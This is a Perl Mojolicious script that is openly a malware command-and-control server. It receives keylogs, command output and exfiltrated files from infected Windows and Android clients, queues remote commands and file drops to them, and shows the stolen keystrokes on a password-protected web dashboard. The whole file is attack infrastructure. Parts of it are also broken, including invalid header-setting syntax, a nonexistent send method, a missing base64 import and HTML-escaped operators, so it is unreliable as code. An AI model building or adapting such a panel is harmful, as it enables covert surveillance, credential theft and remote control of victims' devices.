#!/usr/bin/env perl

use Mojolicious::Lite -signatures;
use IO::Socket::SSL;
use File::Slurp;
use JSON;
use Scalar::Util 'weaken';
use Time::Piece;

# Configuration
my $listen_port = 443;
my $keylog_file = 'keylog.txt';
my $cmd_output_file = 'cmd_output.txt';
my $upload_dir = 'uploads';
my $download_dir = 'downloads';
my $cert_file = 'server.crt';
my $key_file = 'server.key';

# Simple authentication (replace with something more secure for production)
my %users = (
    'admin' => 'password123',
);

# Data structures to manage clients and commands
my %clients; # client_id => { ip => ..., last_seen => ..., commands => [], type => 'windows'|'android' }
my %client_connections; # connection_id => client_id

# Ensure necessary directories exist
mkdir $upload_dir unless -d $upload_dir;
mkdir $download_dir unless -d $download_dir;

# Generate self-signed certificate if it doesn't exist
unless (-e $cert_file &amp;&amp; -e $key_file) {
    print "Generating self-signed certificate...\n";
    system("openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout $key_file -out $cert_file -subj '/CN=localhost'") == 0
        or die "Failed to generate certificate: $!";
    print "Certificate generated.\n";
}

# Helper function to get client ID
sub get_client_id ($c) {
    my $ip = $c->req->remote_address;
    # In a real scenario, you'd want a more robust client identification mechanism
    # like a unique ID sent by the client. For now, using IP as a placeholder.
    return $ip;
}

# Helper function to log data
sub log_data ($file, $client_id, $data) {
    my $timestamp = localtime->strftime('%Y-%m-%d %H:%M:%S');
    open my $fh, '>>', $file or die "Could not open $file: $!";
    print $fh "[$timestamp] Client $client_id:\n$data\n---\n";
    close $fh;
}

# Route for receiving keylogs and command results (POST)
post '/client/data' => sub ($c) {
    my $client_id = get_client_id($c);
    my $payload = $c->req->body;

    # Assuming payload is JSON with 'type' and 'data' fields
    my $json_payload;
    eval {
        $json_payload = decode_json($payload);
    };
    if ($@) {
        $c->render(text => 'Invalid JSON payload', status => 400);
        return;
    }

    my $type = $json_payload->{type};
    my $data = $json_payload->{data};

    if ($type eq 'keylog') {
        log_data($keylog_file, $client_id, $data);
        print "Received keylog from $client_id\n";
    } elsif ($type eq 'cmd_output') {
        log_data($cmd_output_file, $client_id, $data);
        print "Received command output from $client_id\n";
    } elsif ($type eq 'file_chunk') {
        my $filename = $json_payload->{filename};
        my $chunk = $json_payload->{chunk};
        my $offset = $json_payload->{offset};
        my $total_size = $json_payload->{total_size};

        my $filepath = "$upload_dir/$client_id/$filename";
        mkdir "$upload_dir/$client_id" unless -d "$upload_dir/$client_id";

        open my $fh, ($offset == 0 ? '>' : '>>'), $filepath or do {
            $c->render(text => "Could not open file $filepath: $!", status => 500);
            return;
        };
        binmode $fh;
        print $fh read_base64($chunk);
        close $fh;

        print "Received file chunk for $filename from $client_id (offset: $offset)\n";

        # Simple completion check (can be improved)
        if (-s $filepath >= $total_size) {
             print "File $filename upload complete from $client_id\n";
        }

    } else {
        $c->render(text => 'Unknown data type', status => 400);
        return;
    }

    # Update client status
    $clients{$client_id} = { ip => $client_id, last_seen => time, commands => [], type => 'unknown' } unless exists $clients{$client_id};
    $clients{$client_id}->{last_seen} = time;

    $c->render(text => 'OK');
};

# Route for clients to fetch commands (GET)
get '/client/commands' => sub ($c) {
    my $client_id = get_client_id($c);

    # Simple authentication check (for demonstration)
    # In a real C2, clients would authenticate differently
    # For now, assuming client ID is sufficient for command retrieval
    unless (exists $clients{$client_id}) {
         $c->render(text => 'Client not registered', status => 404);
         return;
    }

    my $commands = $clients{$client_id}->{commands};
    my @pending_commands = @$commands;
    @$commands = (); # Clear pending commands

    $c->render(json => { commands => \@pending_commands });
    print "Sent commands to $client_id: " . scalar(@pending_commands) . "\n";
};

# Route for admin to send commands (POST) - requires authentication
post '/admin/command' => sub ($c) {
    my $auth_header = $c->req->headers->authorization;
    unless (defined $auth_header &amp;&amp; $auth_header =~ /^Basic\s+(.*)$/) {
        $c->res->headers->'WWW-Authenticate'('Basic realm="Admin Area"');
        $c->render(text => 'Authentication required', status => 401);
        return;
    }

    my $decoded_auth = decode_base64($1);
    my ($username, $password) = split /:/, $decoded_auth, 2;

    unless (exists $users{$username} &amp;&amp; $users{$username} eq $password) {
        $c->res->headers->'WWW-Authenticate'('Basic realm="Admin Area"');
        $c->render(text => 'Authentication failed', status => 401);
        return;
    }

    my $payload = $c->req->body;
    my $json_payload;
    eval {
        $json_payload = decode_json($payload);
    };
    if ($@) {
        $c->render(text => 'Invalid JSON payload', status => 400);
        return;
    }

    my $client_id = $json_payload->{client_id};
    my $command = $json_payload->{command};

    unless (defined $client_id &amp;&amp; defined $command) {
        $c->render(text => 'Missing client_id or command', status => 400);
        return;
    }

    unless (exists $clients{$client_id}) {
        $c->render(text => "Client $client_id not found", status => 404);
        return;
    }

    push @{$clients{$client_id}->{commands}}, $command;
    $c->render(text => 'Command queued');
    print "Queued command '$command' for client $client_id\n";
};

# Route for admin to download files (GET) - requires authentication
get '/admin/download/:client_id/:filename' => sub ($c) {
    my $auth_header = $c->req->headers->authorization;
    unless (defined $auth_header &amp;&amp; $auth_header =~ /^Basic\s+(.*)$/) {
        $c->res->headers->'WWW-Authenticate'('Basic realm="Admin Area"');
        $c->render(text => 'Authentication required', status => 401);
        return;
    }

    my $decoded_auth = decode_base64($1);
    my ($username, $password) = split /:/, $decoded_auth, 2;

    unless (exists $users{$username} &amp;&amp; $users{$username} eq $password) {
        $c->res->headers->'WWW-Authenticate'('Basic realm="Admin Area"');
        $c->render(text => 'Authentication failed', status => 401);
        return;
    }

    my $client_id = $c->param('client_id');
    my $filename = $c->param('filename');
    my $filepath = "$upload_dir/$client_id/$filename";

    unless (-e $filepath) {
        $c->render(text => 'File not found', status => 404);
        return;
    }

    $c->res->headers->'Content-Disposition'("attachment; filename=\"$filename\"");
    $c->sendFile($filepath);
    print "Admin downloaded file $filename from $client_id\n";
};

# Route for admin to upload files to clients (POST) - requires authentication
post '/admin/upload' => sub ($c) {
    my $auth_header = $c->req->headers->authorization;
    unless (defined $auth_header &amp;&amp; $auth_header =~ /^Basic\s+(.*)$/) {
        $c->res->headers->'WWW-Authenticate'('Basic realm="Admin Area"');
        $c->render(text => 'Authentication required', status => 401);
        return;
    }

    my $decoded_auth = decode_base64($1);
    my ($username, $password) = split /:/, $decoded_auth, 2;

    unless (exists $users{$username} &amp;&amp; $users{$username} eq $password) {
        $c->res->headers->'WWW-Authenticate'('Basic realm="Admin Area"');
        $c->render(text => 'Authentication failed', status => 401);
        return;
    }

    my $payload = $c->req->body;
    my $json_payload;
    eval {
        $json_payload = decode_json($payload);
    };
    if ($@) {
        $c->render(text => 'Invalid JSON payload', status => 400);
        return;
    }

    my $client_id = $json_payload->{client_id};
    my $filename = $json_payload->{filename};
    my $file_content_base64 = $json_payload->{content}; # Base64 encoded file content

    unless (defined $client_id &amp;&amp; defined $filename &amp;&amp; defined $file_content_base64) {
        $c->render(text => 'Missing client_id, filename, or content', status => 400);
        return;
    }

    unless (exists $clients{$client_id}) {
        $c->render(text => "Client $client_id not found", status => 404);
        return;
    }

    # Queue a download command for the client
    # The client will need to handle this command type
    push @{$clients{$client_id}->{commands}}, {
        command => 'download',
        filename => $filename,
        content => $file_content_base64 # Send the base64 content to the client
    };

    $c->render(text => 'File upload command queued');
    print "Queued file upload command for $filename to client $client_id\n";
};


# Helper function to check authentication
sub is_authenticated ($c) {
    return $c->session('authenticated');
}

# Helper function to read log file content
sub read_log_file ($file) {
    if (-e $file) {
        return read_file($file, scalar_ref => 1) || '';
    }
    return '';
}

# Route for the login page
get '/login' => sub ($c) {
    $c->render(template => 'login');
};

# Route to handle login form submission
post '/login' => sub ($c) {
    my $username = $c->param('username');
    my $password = $c->param('password');

    if (exists $users{$username} && $users{$username} eq $password) {
        $c->session(authenticated => 1);
        $c->redirect_to('/dashboard');
    } else {
        $c->flash(error => 'Invalid credentials');
        $c->redirect_to('/login');
    }
};

# Route to handle logout
get '/logout' => sub ($c) {
    $c->session(authenticated => 0);
    $c->redirect_to('/login');
};

# Route for the web dashboard (requires authentication)
get '/dashboard' => sub ($c) {
    unless (is_authenticated($c)) {
        $c->redirect_to('/login');
        return;
    }

    my $keylogs = read_log_file($keylog_file);
    my $cmd_outputs = read_log_file($cmd_output_file);
    my @connected_clients = values %clients;

    $c->render(template => 'dashboard',
        clients => \@connected_clients,
        keylogs => $keylogs,
        cmd_outputs => $cmd_outputs,
        upload_dir => $upload_dir,
    );
};

# Route to handle sending command from dashboard (POST)
post '/dashboard/command' => sub ($c) {
    unless (is_authenticated($c)) {
        $c->redirect_to('/login');
        return;
    }

    my $client_id = $c->param('client_id');
    my $command = $c->param('command');

    unless (defined $client_id && defined $command) {
        $c->flash(error => 'Missing client ID or command');
        $c->redirect_to('/dashboard');
        return;
    }

    unless (exists $clients{$client_id}) {
        $c->flash(error => "Client $client_id not found");
        $c->redirect_to('/dashboard');
        return;
    }

    push @{$clients{$client_id}->{commands}}, $command;
    $c->flash(success => "Command '$command' queued for client $client_id");
    $c->redirect_to('/dashboard');
};

# Route to handle file upload from dashboard (POST)
post '/dashboard/upload' => sub ($c) {
    unless (is_authenticated($c)) {
        $c->redirect_to('/login');
        return;
    }

    my $client_id = $c->param('client_id');
    my $file_upload = $c->param('file'); # This will be a Mojo::Upload object

    unless (defined $client_id && defined $file_upload) {
        $c->flash(error => 'Missing client ID or file');
        $c->redirect_to('/dashboard');
        return;
    }

    unless (exists $clients{$client_id}) {
        $c->flash(error => "Client $client_id not found");
        $c->redirect_to('/dashboard');
        return;
    }

    my $filename = $file_upload->filename;
    my $file_content = $file_upload->slurp;
    my $file_content_base64 = encode_base64($file_content);

    # Queue a download command for the client
    push @{$clients{$client_id}->{commands}}, {
        command => 'download',
        filename => $filename,
        content => $file_content_base64 # Send the base64 content to the client
    };

    $c->flash(success => "File '$filename' queued for upload to client $client_id");
    $c->redirect_to('/dashboard');
};


# Modify the root route to redirect to login or dashboard
get '/' => sub ($c) {
    if (is_authenticated($c)) {
        $c->redirect_to('/dashboard');
    } else {
        $c->redirect_to('/login');
    }
};


# Start the server with HTTPS
app->start(
    qw(daemon -l), "https://*:$listen_port?cert=$cert_file&key=$key_file",
    qw(--listen), "http://*:" . ($listen_port + 1) # Optional: HTTP for web panel development
);

# Base64 helper functions (Mojolicious might have built-in ones, but adding for clarity)
sub encode_base64 ($bytes) {
    require MIME::Base64;
    return MIME::Base64::encode_base64($bytes, '');
}

sub read_base64 ($string) {
    require MIME::Base64;
    return MIME::Base64::decode_base64($string);
}